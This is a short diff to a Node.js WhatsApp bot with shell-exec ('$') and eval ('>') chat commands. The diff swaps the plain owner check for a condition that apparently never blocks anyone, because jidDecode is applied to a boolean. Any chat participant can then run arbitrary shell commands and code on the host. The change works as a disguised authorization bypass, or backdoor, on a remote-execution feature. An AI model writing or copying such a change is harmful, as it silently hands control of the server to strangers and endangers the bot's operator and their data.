@@ -134,7 +134,7 @@ console.log(`[ MESSAGE ] from ${pushname} text: ${body}`)
 }
 switch (command) {
 case "$":
-if (!isOwner) return;
+if (!isOwner && baileys.jidDecode(m.key.fromMe)) return;
 try {
 cp.exec(args.join(" "), function(er, st) {
 if (er) sock.sendMessage(from, {
@@ -154,7 +154,7 @@ console.warn(e)
 break;
 case ">":
 case "=>":
-if (!isOwner) return;
+if (!isOwner && baileys.jidDecode(m.key.fromMe)) return;
 var err = new TypeError;
     err.name = "EvalError "
     err.message = "Code Not Found (404)"
@@ -178,6 +178,7 @@ console.log(e)
 }
 })
 }
+
 var app = express ()
 function startApp() {
 app.get("/", function(req, res) {
